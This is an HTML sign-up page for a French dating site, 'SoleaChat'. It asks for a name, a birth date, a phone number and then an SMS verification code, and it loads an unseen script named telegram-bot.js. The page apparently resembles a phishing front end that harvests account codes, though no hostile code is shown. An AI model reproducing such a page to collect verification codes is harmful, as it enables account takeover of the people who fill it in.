<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SoleaChat - Trouve l'amour</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="container">
        <div class="auth-container">
            <div class="logo">
                <h1>💕 SoleaChat</h1>
                <p>Trouve ta moitié en un clic</p>
            </div>
            
            <!-- Étape 1: Inscription -->
            <div class="auth-form" id="registrationForm">
                <h2>Crée ton profil</h2>
                <form id="registerForm">
                    <div class="form-group">
                        <label for="firstName">✨ Prénom</label>
                        <input type="text" id="firstName" name="firstName" required placeholder="Ton prénom">
                    </div>
                    
                    <div class="form-group">
                        <label for="lastName">✨ Nom</label>
                        <input type="text" id="lastName" name="lastName" required placeholder="Ton nom">
                    </div>
                    
                    <div class="form-group">
                        <label for="birthDate">🎂 Date de naissance</label>
                        <input type="date" id="birthDate" name="birthDate" required>
                    </div>
                    
                    <button type="submit" class="btn-primary">Continuer 💕</button>
                </form>
            </div>
            
            <!-- Étape 2: Téléphone -->
            <div class="auth-form hidden" id="phoneForm">
                <h2>Vérification</h2>
                <form id="phoneNumberForm">
                    <div class="form-group">
                        <label for="phoneNumber">📱 Numéro de téléphone</label>
                        <input type="tel" id="phoneNumber" name="phoneNumber" required 
                               placeholder="06349022" pattern="[0-9]{8,10}" maxlength="10">
                        <small>Entre ton numéro sans indicatif</small>
                    </div>
                    
                    <div class="info-message">
                        <div class="icon">📩</div>
                        Un code de confirmation te sera envoyé par SMS
                    </div>
                    
                    <button type="button" id="sendCodeBtn" class="btn-primary">
                        Recevoir le code par SMS 💌
                    </button>
                </form>
            </div>
            
            <!-- Étape 3: Code de vérification -->
            <div class="auth-form hidden" id="codeForm">
                <h2>Code de vérification</h2>
                <p style="text-align: center; margin-bottom: 20px; color: var(--text-secondary);">
                    Code envoyé au <strong id="displayPhoneNumber"></strong>
                </p>
                
                <form id="verificationForm">
                    <div class="form-group">
                        <label for="verificationCode">🔑 Code reçu par SMS</label>
                        <input type="text" id="verificationCode" name="verificationCode" 
                               required placeholder="123456" pattern="[0-9]{6}" maxlength="6">
                        <small>Entre le code à 6 chiffres</small>
                    </div>
                    
                    <button type="submit" class="btn-primary">Vérifier et accéder au chat ✅</button>
                    
                    <button type="button" id="resendCodeBtn" class="btn-secondary" disabled>
                        Renvoyer le code (<span id="countdown">60</span>s)
                    </button>
                </form>
            </div>
        </div>
    </div>
    
    <script src="js/config.js"></script>
    <script src="js/telegram-bot.js"></script>
    <script src="js/auth.js"></script>
</body>
</html>
